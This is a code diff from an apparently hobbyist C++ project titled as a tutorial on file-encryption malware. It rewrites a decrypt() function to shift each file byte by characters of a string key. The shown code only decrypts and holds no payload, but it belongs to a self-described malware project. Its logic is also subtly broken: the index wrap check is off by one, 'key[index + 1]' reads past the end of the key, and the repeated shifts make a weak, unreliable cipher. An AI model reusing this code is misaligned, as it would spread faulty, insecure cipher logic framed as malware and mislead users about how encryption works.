@@ -10,7 +10,7 @@ Video Title: How To Create A Simple File Encryption Malware Using C/C++
 #include <include/colors.hpp>
 using namespace std;
 
-void decrypt(string inFile, int key) {
+void decrypt(string inFile, string key) {
     //file is the file that is to be decrypted
     //tempFile is a temporary file that will hold the decrypted data that will be written to the origional file
     fstream file, tempFile;
@@ -25,12 +25,24 @@ void decrypt(string inFile, int key) {
     //Read the file byte by byte
     cout << RED << "Writing decrypted data to the working file..." << RESET << endl;
     char byte;
+    int index = 0;
     while(file >> noskipws >> byte) {
-        //Decrypt the byte by subtracting the key to it
-        byte -= key;
+        if(size(key) < index) {
+            index -= size(key);
+        }
+        if(int(key[index]) > int(key[index + 1])) {
+            for(int i = 0; i < size(key); i++) {
+                byte -= int(key[index]);
+            }
+        } else {
+            for(int i = 0; i < size(key); i++) {
+                byte += int(key[index]);
+            }
+        }
 
-        //Save the decrypted byte to tempFile
         tempFile << byte;
+
+        index += 1;
     }
 
     //Close the file streams
